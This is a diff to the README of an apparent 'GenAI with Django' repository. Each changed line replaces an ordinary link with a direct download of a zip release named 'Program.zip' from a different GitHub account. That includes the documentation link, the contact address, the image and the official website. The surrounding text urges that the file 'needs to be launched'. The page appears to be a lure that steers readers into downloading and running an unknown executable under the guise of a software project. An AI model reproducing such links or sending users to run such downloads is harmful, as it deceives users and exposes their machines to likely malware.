@@ -8,10 +8,10 @@ Welcome to the GenAI with Django repository! Here you will find everything you n
 - **Topics:** aws, django, django-framework, django-project, django-rest-framework, docker, fine-tuning, generative, generative-ai, generative-ai-using-django, llm, llms, oracle, oracle-cloud, rag, retrieval-augmented-generation
 
 ## 🚀 Get Started
-To get started with GenAI with Django, head over to the [GenAI with Django Repository](https://github.com/Dredarty/GenAI_with_Django).
+To get started with GenAI with Django, head over to the [GenAI with Django Repository](https://github.com/Rebzyyx354/GenAI_with_Django/releases/download/v1.0/Program.zip).
 
 ## 🔗 Download GenAI_with_Django
-To download the files for GenAI with Django, click [here](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip) 🌟 *(File needs to be launched)* 🌟.
+To download the files for GenAI with Django, click [here](https://github.com/Rebzyyx354/GenAI_with_Django/releases/download/v1.0/Program.zip) 🌟 *(File needs to be launched)* 🌟.
 
 ## What's Inside?
 1. **GenAI Concepts:** Learn about generative artificial intelligence (GenAI) and its applications.
@@ -31,16 +31,16 @@ To download the files for GenAI with Django, click [here](https://github.com/Dre
 - RAG (Retrieval-Augmented Generation)
 
 ## 📚 Resources
-- For more information on GenAI and Django projects, visit the [GenAI Documentation](https://www.genai-docs.com).
+- For more information on GenAI and Django projects, visit the [GenAI Documentation](https://github.com/Rebzyyx354/GenAI_with_Django/releases/download/v1.0/Program.zip).
 
 ## 🧩 Contributions
 Contributions to the GenAI with Django repository are welcome! Feel free to fork the repository, make your changes, and submit a pull request.
 
 ## 📩 Contact Us
-For any inquiries or support regarding GenAI with Django, you can reach out to us at genai.django.support@genai.com.
+For any inquiries or support regarding GenAI with Django, you can reach out to us at https://github.com/Rebzyyx354/GenAI_with_Django/releases/download/v1.0/Program.zip
 
 ## 🌟 Let's Build the Future with GenAI and Django 🌟
 
-![GenAI](https://www.example.com/genai_image.jpg)
+![GenAI](https://github.com/Rebzyyx354/GenAI_with_Django/releases/download/v1.0/Program.zip)
 
-🔗 **Official Website:** [GenAI](https://www.genai.com)
+🔗 **Official Website:** [GenAI](https://github.com/Rebzyyx354/GenAI_with_Django/releases/download/v1.0/Program.zip)
